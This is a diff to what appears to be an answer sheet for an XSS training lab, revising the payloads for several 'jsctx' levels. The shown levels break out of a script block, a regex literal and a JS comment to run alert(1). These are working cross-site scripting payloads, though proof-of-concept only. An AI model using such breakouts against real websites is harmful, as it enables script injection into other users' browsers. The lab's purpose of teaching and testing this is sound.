@@ -11,10 +11,10 @@ Reflection inside `<script>` blocks across various JS contexts (string, object k
 
 ### jsctx-level2
 
-`/jsctx/level2/?query=alert(1),x`
+`/jsctx/level2/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`
 
-- payload: `alert(1),x`
-- context: `var obj = {QUERY: "value"};` — comma to start fresh expression as key
+- payload: `</script><script>alert(1)</script>`
+- context: object-key position; close the script block
 
 ### jsctx-level3
 
@@ -32,14 +32,14 @@ Reflection inside `<script>` blocks across various JS contexts (string, object k
 
 ### jsctx-level5
 
-`/jsctx/level5/?query=/;alert(1);//`
+`/jsctx/level5/?query=x/;alert(1);//`
 
-- payload: `/;alert(1);//`
-- context: `var pattern = /.../g;` — close regex literal, run code
+- payload: `x/;alert(1);//`
+- context: `var pattern = /.../g;` — close a non-empty regex literal, run code
 
 ### jsctx-level6
 
-`/jsctx/level6/?query=*/alert(1)/*`
+`/jsctx/level6/?query=*/alert(1)//`
 
-- payload: `*/alert(1)/*`
-- context: inside `/* ... */` JS comment — close comment, run code
+- payload: `*/alert(1)//`
+- context: inside `/* ... */` — close the comment, run, comment out the rest
